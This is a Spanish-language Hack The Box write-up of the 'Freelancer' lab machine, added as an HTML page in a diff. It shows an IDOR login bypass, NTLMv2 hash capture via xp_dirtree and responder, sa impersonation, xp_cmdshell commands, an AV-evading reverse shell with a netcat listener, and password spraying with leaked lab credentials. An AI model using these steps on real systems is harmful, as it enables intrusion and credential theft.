@@ -1,0 +1,631 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-freelancer-writeup">Hack The Box: Freelancer Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Freelancer&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.230.3 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.230.3 -&gt; <span style="color:#f92672">[</span>53,80,88,135,139,389,445,464,593,3269,3268,5985,9389,49667,49680,49682,49681,49710<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p53,80,88,135,139,389,445,464,593,3269,3268,5985,9389,49667,49680,49682,49681,49710 -sCV 10.129.230.3 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 09:14 CEST
+</span></span><span style="display:flex;"><span>Stats: 0:01:09 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE Timing: About 99.84% <span style="color:#66d9ef">done</span>; ETC: 09:15 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.3
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          nginx 1.25.5
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://freelancer.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.25.5
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-08-05 10:15:08Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49682/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49710/tcp open  unknown
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: 3h00m21s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-08-05T10:16:01
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.99 seconds
+</span></span></code></pre></div><p>En el puerto 80 se realiza una redirección a <code>freelancer.htb</code> , así que vamos a añadir este dominio al <code>/etc/hosts</code></p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<p>No puedo enumerar mediante el uso de una null session nada, ni SMB, RPC, LDAP&hellip;</p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gobuster dir -u http://freelancer.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span></code></pre></div><p>Vemos una ruta <code>/admin</code> que nos va a servir mas adelante.</p>
+<p>Vemos un montón de características para enumerar.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Para la mayoría de estas características me pide que me registre.
+Voy a crear una cuenta de usuario.
+Podemos hacernos una cuenta como <code>Freelancer</code> o como <code>Employeer</code></p>
+<p>Vamos a crearnos una cuenta como <code>Freelancer</code>
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Después de investigar un poco decidí crear una cuenta como <code>employeer</code>
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<h2 id="bypassing-revision">Bypassing Revision</h2>
+<p>Vemos este mensaje de aviso. Parece que nuestra cuenta no podrá ser activada automáticamente y tiene que pasar una revisión previa.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Si creamos la cuenta e intentamos logearnos&hellip;
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Si le damos a <code>Forgot your password?</code> vemos el siguiente mensaje, que nos afirma que si introducimos correctamente las preguntas de seguridad que hemos utilizado al registrarnos, nuestra cuenta será reactivada y podremos cambiar la contraseña..
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Reestablecemos la cuenta..
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Y &ldquo;chiquita&rdquo; cagada, parece que ha habido un error de lógica por detrás y hemos podido activar nuestra cuenta sin pasar la revisión.
+A esto se le llama <code>Logic Error</code> en OWASP.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Me fijé que se utilizaba <code>Django</code> por detrás, lo primero que pensé ahora que podía crear publicaciones es en intentar un SSTI.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Pero esto no surgió efecto.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Jugando con ambas cuentas, al intentar ver los detalles de la cuenta que ha aplicado a mi publicación&hellip;
+<img src="images/Screenshot_12.png" alt="Write-up Image">
+Esto parece que no está bien gestionado.. También se podría publicar en el informe final, pero bueno. Vamos a la &ldquo;chicha&rdquo;.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Detectamos que el ID del admin es <code>2</code> , esto nos servirá mas adelante.
+<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<h1 id="abusing-insecure-direct-object-reference">Abusing Insecure Direct Object Reference</h1>
+<p>Podemos ver un apartado de código QR para poder habilitar One-Time Password.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Si decodificamos este QR vemos una dirección URL.
+<code>http://freelancer.htb/accounts/login/otp/MTAwMTE=/14b70f28e1e6c258ef1ba6ec434fce7a/</code>
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>Me llama la atención la parte de la derecha de <code>/otp/</code> , parece una cadena codificada en base64.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;MTAwMTE=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10011</span>
+</span></span></code></pre></div><p>Es mi ID de usuario!<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>¿Que pasa si ponemos el ID de admin (2)?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;2&#34;</span> | base64
+</span></span><span style="display:flex;"><span>Mgo<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Ahora ingresamos en <code>http://freelancer.htb/accounts/login/otp/Mgo=/14b70f28e1e6c258ef1ba6ec434fce7a/</code></p>
+<p>Y hemos abusado de un IDOR que se acontecía en la función de habilitar OTP en las cuentas de usuario.
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<h1 id="foothold">Foothold</h1>
+<p>Tenía las mismas funciones que con una cuenta de usuario normal, así que me acordé que había una ruta <code>/admin</code>.</p>
+<p>Lo que mas me llama la atención es <code>SQL Terminal</code> ya que podríamos intentar ejecutar comandos de forma remota, o recuperar el hash NTLMv2 e intentar crackearlo offline (Suponiendo que la base de datos por detrás sea MSSQL, que siendo una máquina Windows, es lo mas probable).
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Vamos a ponernos en escucha con <code>responder</code> para interceptar el hash NTLMv2.</p>
+<p>Ahora con <code>xp_dirtree</code> vamos a solicitar un recurso a nuestra IP de atacante.
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> sudo responder -I tun0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.129.230.3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : FREELANCER<span style="color:#ae81ff">\s</span>ql_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : sql_svc::FREELANCER:8bba74ed47f951fa:3D15B9DC9F9CE4F1B7FD33B35E9BBA87:01010000000000008011F4671CE7DA012A9F8B83BA3AE1BE000000000200080053004E005100430001001E00570049004E002D004F0038004A00570035004A004400520035004500380004003400570049004E002D004F0038004A00570035004A00440052003500450038002E0053004E00510043002E004C004F00430041004C000300140053004E00510043002E004C004F00430041004C000500140053004E00510043002E004C004F00430041004C00070008008011F4671CE7DA0106000400020000000800300030000000000000000000000000300000E5FB259A4FE63836BB326D340E644EBA71FA4A5FB33D7FFF8023C362D45BAD890A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310038000000000000000000
+</span></span></code></pre></div><p>Parece que esta credencial no viene contemplada en el <code>rockyou.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ john -w<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>netntlmv2, NTLMv2 C/R <span style="color:#f92672">[</span>MD4 HMAC-MD5 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:07 DONE <span style="color:#f92672">(</span>2024-08-05 09:49<span style="color:#f92672">)</span> 0g/s 1983Kp/s 1983Kc/s 1983KC/s !<span style="color:#f92672">)(</span>OPPQR..*7¡Vamos!
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Vemos que el usuario que está realizando las consultas por detrás no es <code>sa</code> (System Admin).
+Voy a buscar alguna manera para poder migrar a este usuario. Si lo conseguimos, quizás con <code>xp_cmdshell</code> conseguir RCE.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<h2 id="impersonating-sa">Impersonating <code>sa</code></h2>
+<p>Primero tenemos que listar que usuarios podemos impersonar. En <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">HackTricks</a> tiene un apartado <code>Impersonation of other users</code> donde se explica todo esto.</p>
+<p>SQL Server tiene un permiso especial llamado <strong>IMPERSONATE</strong> que permite ejecutar como otro usuarios consultas o funciones especiales hasta que el contexto se reestablezca o la sesión acabe.</p>
+<p><img src="images/Screenshot_21.png" alt="Write-up Image">
+Vemos que podemos impersonar al usuario <code>sa</code>
+<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_23.png" alt="Write-up Image"></p>
+<h2 id="gaining-rce-through-xp_cmdshell">Gaining RCE through <code>xp_cmdshell</code></h2>
+<p>¡Perfecto! Lo único malo es que el contexto de impersonación solo dura hasta que se reestablezca el contexto que es cada vez que termina una consulta, pero esto no es problema.</p>
+<p>Y <code>xp_cmdshell</code> está deshabilitado, pero como somos <code>sa</code> podemos utilizar <code>sp_configure</code> para habilitarlo y conseguir ejecutar comandos.
+<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
+<p>Ejecutando esta consulta podemos activarlo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;Show Advanced Options&#39;</span>, <span style="color:#ae81ff">1</span>; RECONFIGURE; <span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#ae81ff">1</span>; RECONFIGURE;
+</span></span></code></pre></div><p>¡Y conseguimos RCE! Vemos el usuario del cual hemos conseguido antes el hash NTLMv2.
+<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
+<p>Para enviarnos la revshell voy a utilizar <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code></p>
+<p>Simplemente añadimos esa línea al final del script.
+<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
+<p>Y servimos ese archivo por el puerto 8081.
+<code>$ python3 -m http.server 8081</code></p>
+<p>Nos ponemos en escucha con <code>netcat</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y vemos que existe un AV detrás que nos bloquea la ejecución de nuestra reverse shell..
+<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
+<p>Con <a href="https://github.com/D3Ext/Vulkan">Vulkan</a> podemos generar un one-liner ofuscado para poder mandarnos una reverse shell.
+<img src="images/Screenshot_29.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Ahora solo queda ejecutar este script&hellip;
+<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
+<p>¡Bingo!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.3<span style="color:#f92672">]</span> <span style="color:#ae81ff">61187</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>freelancer<span style="color:#ae81ff">\s</span>ql_svc
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><h1 id="user-pivoting-1">User Pivoting 1</h1>
+<p>Enumerando el directorio personal de trabajo del usuario <code>sql_svc</code> encontramos un directorio <code>SQLEXPR-2019_x64_ENU</code>
+Es el instalador para la base de datos MSSQL, en el archivo de configuración inicial <code>sql-Configuration.INI</code> vienen unas credenciales hardcodeadas.</p>
+<pre tabindex="0"><code>SQLSVCACCOUNT=&#34;FREELANCER\sql_svc&#34;
+SQLSVCPASSWORD=&#34;IL0v3ErenY3ager&#34;
+</code></pre><p>con <code>net users</code> podemos recolectar los usuarios y con <code>netexec</code> probar si esta credencial es válida para algún usuario, aunque ya me hago una idea&hellip;
+<img src="images/Screenshot_31.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.3 -u users.txt -p <span style="color:#e6db74">&#39;IL0v3ErenY3ager&#39;</span> --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\a</span>dministrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\a</span>lex.hill:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\c</span>arol.poland:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\d</span>.jones:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\d</span>thomas:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\e</span>reed:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\E</span>than.l:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\e</span>velyn.adams:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\G</span>uest:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\h</span>king:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>en.brown:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>green:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>martinez:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\k</span>rbtgt:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>eon.sk:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>kazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>orra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>aya.artmes:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>ichael.williams:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>ikasaAckerman:IL0v3ErenY3ager
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\o</span>livia.garcia:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>amuel.turner:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>davis:IL0v3ErenY3ager STATUS_LOGON_FAILURE
